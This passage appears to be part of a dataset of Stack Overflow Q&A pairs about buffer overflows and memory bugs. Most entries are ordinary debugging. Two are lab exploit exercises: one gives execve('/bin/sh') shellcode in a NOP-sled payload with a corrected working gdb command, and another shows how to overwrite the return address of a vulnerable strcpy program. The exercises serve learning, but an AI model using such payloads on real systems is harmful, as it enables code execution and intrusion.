        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
